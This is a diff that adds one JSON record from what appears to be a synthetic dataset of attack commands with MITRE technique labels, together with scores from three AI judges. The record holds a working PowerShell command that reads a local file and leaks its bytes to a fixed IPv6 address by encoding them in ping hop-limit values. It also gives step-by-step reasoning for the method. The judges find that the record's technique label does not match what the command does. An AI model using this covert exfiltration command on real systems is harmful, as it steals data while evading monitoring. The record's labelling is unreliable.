@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d='fd00:abba::1'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ $hi=($b -shr 4); $lo=($b -band 0x0F); Test-Connection -ComputerName $d -Count 1 -TimeToLive (70 + $hi) -IPv6 -Quiet | Out-Null; Test-Connection -ComputerName $d -Count 1 -TimeToLive (100 + $lo) -IPv6 -Quiet | Out-Null }",
+  "explanation": "Uses ICMPv6 TTL ranges to encode high/low nibbles of each byte, transmitting over ICMPv6 as an alternate medium aligned to T1011.",
+  "rationale_steps": [
+    "Split each byte into two 4-bit values.",
+    "Map nibbles into two distinct TTL ranges for clarity.",
+    "Send sequential ICMPv6 echos that a passive listener can reconstruct."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-3c199886",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with proper variable declarations, balanced parentheses/braces, correct operators, and valid cmdlet syntax for Test-Connection.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command is technically functional for exfiltrating data via covert ICMPv6 TTL values, it's misaligned with T1011 (Modify System Image) as it performs data exfiltration rather than firmware/OS modification.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T19:49:26.987015Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Powershell command is perfectly well-formed with correct syntax for variable assignments, file operations, loops, bitwise operators, cmdlet usage, and parameter formatting.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs data exfiltration via ICMPv6 TTL encoding, which is unrelated to the T1011 technique of modifying system images as explicitly claimed in the explanation.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T19:49:41.059514Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell is well-formed with correct operators, parameters, quoting, and balanced braces, and uses valid Test-Connection flags and expressions.",
+        "semantic_score": 1,
+        "semantic_justification": "This command exfiltrates data via ICMPv6 hop-limit (TTL) encoding rather than modifying any system/firmware image or boot components, so it is not aligned with the provided technique description.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T19:50:28.247506Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.333,
+    "llm_average_score": 3.167,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
